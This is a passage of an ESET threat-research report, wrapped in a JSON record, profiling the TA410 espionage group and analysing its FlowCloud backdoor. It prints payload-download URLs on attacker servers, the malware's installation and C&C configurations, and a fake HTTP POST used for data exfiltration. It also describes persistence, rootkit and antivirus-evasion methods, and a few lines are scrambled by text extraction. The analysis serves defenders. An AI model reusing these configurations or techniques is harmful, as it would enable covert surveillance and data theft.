{
    "id": "6a4ee8e3-8931-4e74-a9e8-7c27035be759",
    "created_at": "2023-01-12T15:10:30.293905Z",
    "updated_at": "2025-03-27T02:15:46.109137Z",
    "deleted_at": null,
    "sha1_hash": "95f13119065e0b0149edc755bd16f278c3a2a542",
    "title": "2022-04-27 - A lookback under the TA410 umbrella- Its cyberespionage TTPs and activity",
    "authors": "",
    "file_creation_date": "2022-05-28T00:37:26Z",
    "file_modification_date": "2022-05-28T00:37:26Z",
    "file_size": 1818097,
    "plain_text": "# A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity\n\n**welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/**\n\nApril 27, 2022\n\nESET researchers reveal a detailed profile of TA410: we believe this cyberespionage umbrella group consists of three different teams using\ndifferent toolsets, including a new version of the FlowCloud espionage backdoor discovered by ESET.\n\nESET researchers reveal a detailed profile of TA410: we believe this cyberespionage umbrella group consists of three different teams using\ndifferent toolsets, including a new version of the FlowCloud espionage backdoor discovered by ESET.\n\nESET researchers have documented and analyzed TA410 activity going back to 2019. TA410 is a cyberespionage umbrella group loosely\nlinked to APT10, known mostly for targeting US-based organizations in the utilities sector, and diplomatic organizations in the Middle East and\n[Africa. TA410 has been active since at least 2018 and was first publicly revealed in August 2019 by Proofpoint in its LookBack blogpost. A](https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks)\n[year later, the then-new and very complex malware family called FlowCloud was also attributed to TA410.](https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new)\n\nIn this blogpost, we provide a detailed profile of this APT group, including its modus operandi and toolset that includes a new version of\nFlowCloud, discovered by ESET. This very complex backdoor contains interesting espionage capabilities. ESET will present its latest findings\n[about TA410, including results from ongoing research, during Botconf 2022. For YARA and Snort rules, consult ESET’s GitHub account.](https://www.botconf.eu/)\n\n**Key points in this blogpost:**\n\nTA410 is an umbrella group comprised of three teams ESET researchers named FlowingFrog, LookingFrog and JollyFrog, each with its\nown toolset and targets.\nESET telemetry shows victims all around the world, mainly in the governmental and education sectors.\n[TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., ProxyLogon in March](https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/)\n[2021 and ProxyShell in August 2021.](https://www.welivesecurity.com/wp-content/uploads/2022/02/eset_threat_report_t32021.pdf)\nESET researchers found a new version of FlowCloud, a complex and modular C++ RAT. It has several interesting capabilities, including:\n\nControlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected.\nMonitoring clipboard events to steal clipboard content.\nMonitoring file system events to collect new and modified files.\nControlling attached camera devices to take pictures of the compromised computer’s surroundings.\nFlowCloud deploys a rootkit to hide its activity on the compromised machine.\nThe LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server\ncommunications.\nTA410 is one of the users of the Royal Road malicious document builder.\n\nTA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers\nchoosing which entry method has the best chance of infiltrating the target.\n\n\n-----\n\ne st stage o t e o C oud e s o de t ed by S esea c e s ca c ec et e spec c secu ty so t a e s sta ed o t e\nmachine it tries to compromise, but this isn’t implemented in the loaders we analyzed. However, we found a custom AntivirusCheck class,\nwhich can check running processes against a hardcoded list of executable filenames from known security products, including ESET products.\nIn case one of these products is detected, FlowCloud goes through its regular loading process and cancels the auto_start_after_install\nconfiguration value.\n\nEven though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this\nversion include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current\nforeground window. This information can help attackers understand stolen data by contextualizing it.\n\nFlowCloud can also gather information about things happening around the victim’s computer by taking pictures using connected camera\nperipherals and recording audio using a computer’s microphone. This latter function is triggered by any sound over a threshold of 65 decibels,\nwhich is in the upper range of normal conversation volume.\n\n## Attribution\n\nESET researchers believe that TA410 is composed of three different teams, using very similar tactics, techniques, and procedures (TTPs) but\ndifferent toolsets and exiting from IP addresses located in three different districts. These teams, referred to below as FlowingFrog,\nLookingFrog, and JollyFrog, have overlaps in TTPs, victimology and network infrastructure.\n\n**FlowingFrog uses** _[Royal Road RTF documents, a first-stage implant called Tendyron, and a very complex second-stage backdoor](https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html)_\ncalled FlowCloud.\n**LookingFrog uses a first-stage backdoor called X4, and LookBack as a second stage.**\n**JollyFrog uses only generic malware families such as Korplug (aka PlugX) and QuasarRAT. Part of the activity of this team was**\n[described by Fortinet, who attributed the activity to APT10. ESET researchers, however, believe this activity is different from the](https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-)\n[operations that APT10 (aka A41APT) has conducted recently.](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)\n\nFlowingFrog and JollyFrog share network infrastructure – more precisely, the domain ffca.caibi379[.]com, as mentioned by _[Proofpoint.](https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new)_\n\nFlowingFrog and LookingFrog ran a phishing campaign at the same time against the same targets, as also mentioned in the same Proofpoint\narticle.\n\nIn ESET telemetry, we do not see any other overlap between these subgroups. We believe that these subgroups operate somewhat\nindependently but that they may share intelligence requirements, an access team that runs their spearphishing campaigns, and also the team\nthat deploys network infrastructure.\n\n## Victimology\n\nMost TA410 targets are high-profile organizations in the diplomacy and education sectors, but we have also seen victims in the military sector,\na manufacturing company in Japan, a mining company in India, and a charity in Israel. According to ESET telemetry, the victims are located\nin Africa, Asia, the Middle East, and Europe. Interestingly, there is no clear segmentation of the targeting (by sector or geography) among the\ndifferent teams.\n\nAn element worth mentioning is that TA410 targets foreign individuals in China. In ESET telemetry, we have observed this as having\nhappened at least twice: for instance, one victim is a French academic, and another is a member of a diplomatic mission of a South Asian\ncountry in China.\n\nSince 2018, we have seen the following targets, also depicted in Figure 1:\n\n**FlowingFrog: University, foreign diplomatic mission of a South Asian country in China, mining company**\n**LookingFrog: Diplomatic missions, charity, government and industrial manufacturing**\n**JollyFrog: Education, church, military, diplomatic mission**\n\n\n-----\n\n_Figure 1. Map of countries and verticals targeted by TA410_\n\n## Initial compromise and typical TTPs\n\nIf we exclude the different backdoors, the three teams use a similar modus operandi. They compromise their targets either by spearphishing,\naccording to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or\nSharePoint. This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given\ntarget.\n\nThe public-facing application compromise approach is what we have seen the most. Attackers linked to LookingFrog exploited Microsoft\n[SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604. They then dropped an ASPX webshell that was](https://nvd.nist.gov/vuln/detail/CVE-2019-0604)\nused to install other malicious components. These were either dropped directly via the webshell or downloaded from a remote server using\n_[certutil.exe, a known](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)_ _[LOLBin.](https://github.com/LOLBAS-Project/LOLBAS#user-content-the-history-of-the-lolbin)_\n\nIn 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications.\n\nIn August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company\nin Japan. This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in ESET Threat\n_Report T3 2021._\n\nThis shows that LookingFrog operators closely follow the discovery of RCE vulnerabilities in popular server applications and quickly make use\nof any available exploit in order to gain control of unpatched servers run by organizations on their target lists.\n\nIn addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability\n[scanners, exploits from the Equation Group leaks, proxy/tunneling utilities (HTran,](https://cyber.gc.ca/en/guidance/c2-obfuscation-tools-htran) _[LCX,](https://github.com/UndefinedIdentifier/LCX)_ _[EarthWorm), and lateral movement scripts such as](https://github.com/rootkiter/EarthWorm)_\n_[WMIExec.](https://jpcertcc.github.io/ToolAnalysisResultSheet/details/wmiexec-vbs.htm)_\n\n## Arsenal\n\n### TA410 – FlowingFrog\n\nFlowingFrog uses a first stage that ESET researchers have named the Tendyron downloader, and a complex second stage named\nFlowCloud, so named by the developers in its modules’ PDB paths.\n\n**_Royal Road and Tendyron downloader_**\n\n[Royal Road is a malicious document builder used by several cyberespionage groups (see the analysis by nao_sec). Files built with this tool](https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html)\n[are RTF documents exploiting Equation Editor N-day vulnerabilities such as CVE-2017-11882. TA410 operators always use the Royal Road](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882)\nencoding bytes: A9 A4 6E FE, as seen in Figure 2.\n\n\n-----\n\n_Figure 2. Encoded Royal Road payload_\n\nOn October 13 2020, we noticed that a new Royal Road RTF document, shown in Figure 3, had been uploaded to th _[VirusTotal.](https://www.virustotal.com/gui/file/c88d0f7d623b2a2c066dd6b15597d1f4c44d89e7a8e660e28c3494f441826ea5)_\n\n\n_Figure 3. Royal Road RTF document found on VirusTotal (SHA‑1: ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20)_\n\nWhen opened, the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process. The PE\nresources 103, 104 and 105 contain the payload URLs, XORed with 0xD3. The following files are downloaded and written to disk:\n\nhttp://103.139.2[.]93:1702/tdr.dat written to %localappdata%\\Tendyron\\Tendyron.exe\n(SHA-1: 09C76522136B5E9BAB74381FEEE265F7E9B1D550)\nhttp://103.139.2[.]93:1702/okt.dat written to %localappdata%\\Tendyron\\OnKeyToken_KEB.dll\n(SHA‑1: F359D3C074135BBCA9A4C98A6B6544690EDAE93D)\nhttp://103.139.2[.]93:1702/md.dat written to %localappdata%\\Tendyron\\Tendyron.conf\n(we were not able to retrieve this file)\n\nFinally, this process separately downloads http://103.139.2[.]93:1702/t86.dat (resource 101), loads it into memory, and calls its startModule\nexport. Unfortunately, we were not able to retrieve this sample.\n\n\n-----\n\ne dy o e e s a eg t ate e ecutab e, s g ed by o e ba g secu ty e do e dy o Co po at o, a d t at s u e ab e to\nsearch-order hijacking. Persistence for the downloaded payload is established via the Tendyron value under the Run key\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.\n\nWhen executed, Tendyron.exe loads the malicious OnKeyToken_KEB.dll. The export OnKeyT_ContextInit contains code that decrypts\nhardcoded shellcode (see Figure 4) and injects it into iexplore.exe using WriteProcessMemory.\n\n_Figure 4. Shellcode decryption loop_\n\nThe next stage, injected into iexplore.exe, is a backdoor written using the Microsoft Foundation Class (MFC) framework. It also contains RTTI\nsymbols and thus a few C++ class names:\n\nClientSocket\nManager\nDllManager\nKernelManager\n\nThese class names are the same as used in Farfli/Gh0stRAT, a backdoor that has been used for more than 10 years to conduct (mostly)\n[cyberespionage operations. Its source code was leaked and is now available on GitHub. Thus, we believe that TA410 developers reused](https://github.com/sin5678/gh0st)\ncode copied from Farfli.\n\nThe C&C server is hardcoded, in cleartext, in the sample; in this specific case, it is set to 114.118.83[.]141.\n\nOn VirusTotal, as shown in Figure 5, we can see one more HTTP request to 103.139.2[.]93 was triggered during the execution of the RTF file.\nThe result of the request to http://103.139.2[.]93:1702/SL3716/S8437AEB.DAT was recorded by VirusTotal and the SHA-1 of this encrypted\nfile is 140F81037A76B7B16A00E1D5E0E2CD9F6687F642. This URI is typical of those used to download FlowCloud, a complex C++ implant\ndescribed in the next section.\n\n\n-----\n\n_g_ _q_ _y_ _g_\n\nThe identical encrypted file was also downloaded from http://114.55.109[.]199:56022/SL3716/S8437AEB.DAT by a FlowCloud dropper\nversion 4.1.3 (SHA‑1: 014421BDB1EA105A6DF0C27FC114819FF3637704). A summary of the compromise chain is provided in Figure 6.\n\n_Figure 6. Compromise chain from the Royal Road document to FlowCloud_\n\n**_FlowCloud_**\n\nFlowCloud is a complex implant written in C++. It consists of three main components, deployed in a multistage process that uses various\nobfuscation and encryption techniques to hinder analysis. Multiple versions of FlowCloud have been identified since 2020, most notably\nversions _[4.1.3 and](https://www.proofpoint.com/us/blog/threat-insight/flowcloud-version-413-malware-analysis)_ _[5.0.1 described by Proofpoint. In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3. Contrary to those previously](https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new)_\nfound, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.\n\n[This deployment process is very similar to the one described by Proofpoint for version 5.0.1. The three main components are a driver with](https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new)\nrootkit functionality, a simple persistence module, and a custom backdoor. We describe these in detail in the upcoming sections.\n\n**_Loader (ClientLdrExe)_**\n\nThe first stage is responsible mostly for creating the files and registry keys used by the other stages. The values for these executables and\nconfiguration data can be found, encrypted, in the loader’s resource section. Table 1 contains an overview of these resources and their use.\n\n_Table 1. Contents of the dropper’s resources_\n\n\n-----\n\n**Resource IDResource ID** **RoleRole** **Internal nameInternal name**\n\n**100** FlowCloud RAT DLL fcClientDll\n\n**101** 32-bit rootkit driver Driver\n\n**102** 64-bit rootkit driver Driver\n\n**103** DLL hijacking vulnerable app N/A\n\n**104** Shellcode loaded by the malicious library in the DLL hijacking SETLANG_dlcore\n\n**105** Shellcode that loads fcClient (unused) N/A\n\n**106** Final dropper stage fcClient\n\n**107** 32-bit persistence module fcClientWD_x86\n\n**108** 64-bit persistence module fcClientWD_x64\n\n**109** Legitimate library used for module stomping slam\n\n**110** DLL used for hijacking XXXModule_dlcore0\n\n**1000** Protobuf serialized FlowCloud configuration N/A\n\n**1001** Dropper configuration N/A\n\n**2000** Used as an alternative or extension to resource 2001 N/A\n\n**2001** Path to the registry key for the PrintProcessor service (used by the driver) N/A\n\n**10000** Installation configuration N/A\n\nIn the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed. In some cases,\nthey are then re-encrypted but with a different key. This technique makes it harder to dump the plaintext values from the process’s memory\nand to analyze exit dumps. The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the\ninstallation configuration. The samples we analyzed all store their files in the %ProgramFiles%\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\\ndirectory; we believe that this is the default value. FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g.,\nrebare.dll which could be mistaken for rebar.dll) or innocuous looking (e.g., AC146142) to avoid suspicion.\n\nFigure 7 presents a graphical overview of the deployment process and its elements. We explain each of the steps in further detail in the\nupcoming sections.\n\n\n-----\n\n_Figure 7. FlowCloud deployment process_\n\nFirst, the loader decrypts and parses the embedded installation configuration, which uses the Windows INI format. This configuration defines\nthe malware’s install path along with the filename or registry key where each embedded resource is to be written. The same values are\nhardcoded in the following stages, which leads us to think that the samples are generated using a builder. In a sample we analyzed, this\nconfiguration is accompanied with comments explaining the values for some sections. Figure 8 shows this installation configuration with the\ncomments translated to English.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n\n#Product name, these will be used in the configuration generator and applied to the front end\n\n[product]\n\nproduct_chs_name=Sky Arrow\n\nproduct_name=PCArrowI\n\nproduct_version=v5.0.2\n\n[general]\n\n\n-----\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n\n_ g p\n\ninstall_folder=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\n\ndata_folder=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\fcdata\n\nhide_user_activity_tab = 0\n\n#File path, not including drive letter\n\n[file]\n\n100=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\responsor.dat\n\n103=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\setlang.exe\n\n104=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\setlangloc.dat\n\n#105=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\rebare.dat\n\n106=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\rescure.dat\n\n107=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\rescure86.dat\n\n108=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\rescure64.dat\n\n109=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\sspisrvui.dat\n\n110=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\setlangloc.dll\n\n101=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\E86F36C4\n\n102=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\AC146142\n\n1000=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\E19D9D4B\n\n#0x0001 Release without decryption\n\n#0x0002 Decryption release\n\n[file_out_type]\n\n100=0x0001\n\n103=0x0002\n\n104=0x0002\n\n#105=0x0002\n\n106=0x0002\n\n107=0x0002\n\n108=0x0002\n\n109=0x0002\n\n110=0x0002\n\n101=0x0001\n\n102=0x0001\n\n1000=0x0001\n\n##Registry path: separated by'|', respectively representing HKEY_LOCAL_MACHINE, path name, value name\n\n[key]\n\n##100=0x80000002|SYSTEM\\Setup\\PrintResponsor|1\n\n#101=0x80000002|SYSTEM\\Setup\\PrintResponsor|2\n\n#102=0x80000002|SYSTEM\\Setup\\PrintResponsor|3\n\n\n-----\n\n51\n\n52\n\n53\n\n54\n\n55\n\n56\n\n57\n\n58\n\n59\n\n60\n\n61\n\n62\n\n63\n\n64\n\n65\n\n66\n\n67\n\n68\n\n69\n\n70\n\n\n| p p |\n\n##2000=0x80000002|SYSTEM\\Setup\\AllowStart\\ceipCommon|1\n\n##2001=0x80000002|SYSTEM\\Setup\\AllowStart\\ceipCommon|2\n\n2001=0x80000002|SYSTEM\\Setup\\AllowStart\\ceipCommon|1\n\n##0x0001 Release without decryption\n\n##0x0002 Decryption release\n\n[key_out_type]\n\n##100=0x0001\n\n#101=0x0001\n\n#102=0x0001\n\n#1000=0x0001\n\n#2000=0x0002\n\n2001=0x0002\n\n#Service Information: hhw.exe needs to be dynamically generated\n\n[service_attribute]\n\nis_hhw=0\n\nservice_name=PrintResponsor\n\nservice_path=%ProgramFiles%\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\setlang.exe\n\nservice_parm=\n\n\n_Figure 8. Installation configuration with explanatory comments. Note that some fields are commented out._\n\nThe configuration can also contain a section defining specific security software to check for, but this isn’t implemented in the loaders we\nanalyzed. However, there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted\nexecutable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus,\nKingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro. This class is only used if the loader is set to directly start the fcClient\nmodule via the auto_start_after_install configuration key.\n\nDepending on the configuration keys used, the loader can either load the fcClientDll RAT module directly, thus bypassing most of the complex\ndeployment process, or it can create a service or scheduled task. In the former case, the task or service attains persistence by being set to\nstart automatically on boot. In the samples we observed, the task or service was configured to execute the next step of the installation\nprocess by running a legitimate application vulnerable to DLL search-order hijacking. The application and the accompanying relevant and\nmalicious DLL were both embedded in the loader’s resources.\n\n**_DLL side-loading (XXXModule_dlcore0)_**\n\nIn the samples we analyzed, the vulnerable application was either setlang.exe from Microsoft Office 2003 with a malicious setlangloc.dll or\nvpreview.exe from Visio Preview 2007 with a malicious vviewres.dll. Strings contained in the malicious DLL also point to emedres.dll from\nEmurasoft’s EmEditor as a possible third target for DLL side-loading. This is a real possibility as such vulnerabilities were present in older\nversions of EmEditor, but we did not see any samples using it.\n\nIn all observed samples, the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same\nname as the DLL, but with a .dat extension. We analyze this shellcode in the next section, but first, we want to look at the notable antianalysis techniques used in this library.\n\nDespite its relatively simple goals, the library’s code makes heavy use of anti-debugging tricks and control flow obfuscation to hinder analysis.\nIn the function that loads the next file, the useful code is repeatedly interspersed with the same sequence of opcodes to obfuscate the\nprogram’s flow. As shown in Figure 9, this short snippet is packed full of anti-analysis tricks, but ultimately amounts to an unconditional 16byte jump. This is enough to foil many automatic analyses, including decompilers.\n\n\n-----\n\n_Figure 9. Annotated disassembly of the control flow obfuscation snippet_\n\nThe above snippet is bookended by calls to two anti-debugging functions, as can be seen in Figure 10. The function, which we named\ncrash_if_debugger in the previous screenshot, calls IsDebuggerPresent and checks some commonly hooked library functions for a breakpoint\nas their first instruction. If those checks detect a debugger, the function returns a value that will cause the program to jump to an invalid\naddress and crash. The second one raises an exception via the INT 0x2D instruction and exits if it was handled by a debugger.\n\n_Figure 10. Decompiler view showing the obvious pattern of anti-debugging checks. Note that we had to remove the aforementioned obfuscation for the_\n\n_decompiler to produce any output._\n\n**_fcClient (rescure.dat)_**\n\nWhen it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules. It then sets specific\nregistry keys and files as guardrails to skip the setup on subsequent runs.\n\nFirst, persistence is established by using the ITaskService COM interface to create the \\Microsoft\\Windows\\CertificateServicesClient\\NetTask\nscheduled task. If a task with the same name already exists, it is deleted before the new one is created. This task will run the DLL hijacking\ntarget as SYSTEM at each boot.\n\nAfterwards, the rootkit module is decrypted and written to the %System%\\drivers folder as hidmouse.sys. A hidmouse service is then created\nto run that module and is immediately started. The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver\nfrom the same folder. Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file.\n\nOn Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013. Both this and the\nuse of the legitimate driver directory help the rootkit blend in with other drivers.\n\nThe following files are copied to the %System% directory:\n\nThe backdoor: rescure.dat\n[A decoy DLL: sspisrvui.dat as sspisrvui.dll (timestomped to July 2013)](https://attack.mitre.org/versions/v9/techniques/T1070/006/)\nThe encrypted shellcode: rebare.dat\n\nThe rebare.dat shellcode is very similar to that used in the self-decrypting DLL, but it loads fcClient directly.\n\nFlowCloud then starts a suspended process to perform injection on it. This process is created via CreateProcessAsUserW using a token\nretrieved from the explorer.exe or winlogon.exe process in the current session.\n\nThe injected code loads the same backdoor (rescure.dat) into the process’s memory and calls its startModule export to finish the installation.\nMeanwhile, the injection process is terminated.\n\n\n-----\n\nt t s po t, sta at o o t e bac doo s co p ete t at s e t s to e ecute t e bac doo o ac e e t s, t e e p ocess oads t e\n[decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as module stomping or DLL hollowing),](https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/)\nbefore calling its main function.\n\n**_fcClientDll (responsor.dat)_**\n\nThis complex module is the main component of the backdoor. It provides a wide range of capabilities from full file system access to control of\ncamera peripherals and everything in between. Although we did not observe any plug-ins, the backdoor contains code that hints that they can\nbe used to further extend functionality.\n\nBefore diving deeper into the functionalities, we want to highlight some notable characteristics:\n\n[Configuration information and data for communications with the C&C server are Protobuf-serialized, compressed, and encrypted.](https://github.com/protocolbuffers/protobuf)\nFile exfiltration is done through encrypted, Protobuf-serialized structures and is disguised as HTTP by prepending the data with a\nhardcoded, fake POST request. The Content-Length header is the only variable element, as it is set to the actual size of the data sent.\nThis hardcoded request can be seen in Figure 11.\nMultiple functionalities are implemented through the use of COM objects and interfaces.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n\nPOST /messagebroker/amf HTTP/1.1\n\nHost: s.peheavens.com\n\nConnection: keep-alive\n\nContent-Length: <content_length>\n\nOrigin: http://s.peheavens.com\n\nX-Requested-With: ShockwaveFlash/20.0.0.306\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36\n\nContent-Type: application/x-amf\n\nAccept: */*\n\nReferer: http://s.peheavens.com/html/portlet/ext/draco/resources/draco_manager.swf/[[DYNAMIC]]/1\n\nAccept-Encoding: gzip, deflate\n\nAccept-Language: zh-CN,zh;q=0.8\n\nCookie: COOKIE_SUPPORT=true; JSESSIONID=5C7E7A60D01D2891F40648DAB6CB3DF4.jvm1; COMPANY_ID=10301;\nID=666e7375545678695645673d; PASSWORD=7a4b48574d746470447a303d; LOGIN=6863303130;\nSCREEN_NAME=4a2b455377766b657451493d; GUEST_LANGUAGE_ID=en-US\n\n\n_Figure 11. Hardcoded, fake HTTP POST request used for FlowCloud C&C communication_\n\nThis component uses an encrypted, Protobuf-serialized configuration that it tries to read from a file on disk or a registry key. The\nconfigurations we observed were composed of three sections:\n\n1. server_config: This section contains information about the C&C servers and identification information about the victim and backdoor.\n2. policys [sic]: This section defines the behavior of the backdoor’s components and is described in detail in the following paragraphs.\n3. install_config: As the name indicates, this section defines the installation parameters.\n\nAn example of such a server_config is shown in Figure 12. This configuration corresponds to resource 1000 in the initial loader. It defines the\naddress and port for both the exfiltration server (file_server) and the C&C server (exchange_server), along with the encryption key to use for\ncommunication with each. A fallback server can also be defined for each of these. The file_key field defines the encryption key to use when\nstoring files that are to be exfiltrated. The other entries are used to identify the backdoor and the victimized host:\n\nproduct_name: A name for the backdoor in use. PCArrowI seems to correspond to FlowCloud.\nproduct_version: The backdoor’s version.\nid_prefix: This value is prefixed to the generated ID. Presumably, used to group victims or campaigns.\nid: This value uniquely identifies the victim. Initially, it is empty; the value is generated on the first execution using the following format:\n<prefix>_<current timestamp>_<machine hostname>\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n\nserver_config\n\n{\n\nproduct_name: “PCArrowI\"\n\nproduct_version: \"v5.0.2\"\n\nid: \"1202_[REDACTED]\"\n\nroot: \"\"\n\nfile_server: \"47.111.22[.]65\"\n\nfile_server_port: \"80\"\n\nfile_server_bak: \"\"\n\nfile_server_bak_port: \"\"\n\nexchange_server: \"47.111.22[.]65\"\n\nexchange_server_port: \"81\"\n\nexchange_server_bak: \"\"\n\nexchange_server_bak_port: \"\"\n\nfile_server_key: \"E\\367\\016\\031<…>\"\n\nxchg_server_key: \"8\\335\\325$<…>\"\n\nfile_key: \"U\\267\\323\\353\\<…>\"\n\nis_audio_only: false\n\nid_prefix: \"1202\"\n\n}\n\n\n_Figure 12. server_config section of a decoded FlowCloud configuration_\n\nFlowCloud’s capabilities are spread out over a series of singleton classes, each of which implements a cohesive set of functionalities related\nto a specific type of data or action. These roughly follow an internal naming convention where classes with names ending with\nmanager_handler perform actions in response to C&C commands, while those whose names end with manager automatically perform actions\nbased on timers or event listeners.\n\nEach manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&C server.\nData is encrypted with the aforementioned file_key before being inserted into the database. The location of the SQLite databases is defined\nby the data_folder install configuration key, with the default value being %ProgramFiles%\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\fcdata.\n\nThe classes are orchestrated by an instance of fc_kernel_manager. This object is responsible for initializing other components and handling\nC&C connections. It can also update the local configuration when the corresponding command is received.\n\nAs shown in Figure 13, parameters and frequency of automated actions can be specified and finely tuned through configuration policies. Data\nexfiltration is likewise automated: policies can contain a cache_size or cache_count parameter, which determines how much data can be\ncollected locally by the corresponding class before it is staged for exfiltration.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\npolicys {\n\nkeyboard_policy {\n\nstate: true\n\ncycle_time: 60\n\nlimit_size: 100\n\ncache_size: 10\n\n}\n\nscreen policy {\n\n\n-----\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n50\n\n\ncycle_time: 30\n\ncache_count: 200\n\nbit_depth: 4\n\n}\n\naudio_policy {\n\nstate: false\n\ncache_size: 100\n\ndecibel_limit: 65\n\ncontinue_seconds: 15\n\n}\n\nsmfile_search_policy {\n\nguid: \"XXXX-XXXX-XXXX-XXXXXXXXXXXXXXXX\"\n\nstate: false\n\nresearch: true\n\ninc_all_removable: true\n\ninc_all_fixed: true\n\nlimit_size: 1\n\nrecent_days: 30\n\nfilter: \"*.doc\"\n\nfilter: \"*.docx\"\n\nfilter: \"*.xls\"\n\nfilter: \"*.xlsx\"\n\nfilter: \"*.ppt\"\n\nfilter: \"*.pptx\"\n\nfilter: \"*.bmp\"\n\nfilter: \"*.jpg\"\n\nfilter: \"*.png\"\n\nfilter: \"*.gif\"\n\ncache_size: 1024\n\nb_exclude_system_files: true\n\nb_exclude_system_folders: true\n\n}\n\ninstalledapp_policy {\n\nstate: false\n\n}\n\nclipboard_policy {\n\nstate: false\n\nignore_repeat: true\n\ncycle_time: 300\n\nlimit_size: 100\n\n\n-----\n\n52\n\n53\n\n54\n\n55\n\n56\n\n57\n\n\ng _ _\n\ncache_size: 50\n\n}\n\nuser_activity_policy {\n\nprocess_activity_state: false\n\nbrowser_activity_state: false\n\n}\n\n}\n\n\n_Figure 13. The policys [sic] section of a decoded FlowCloud config_\n\nAs we have previously 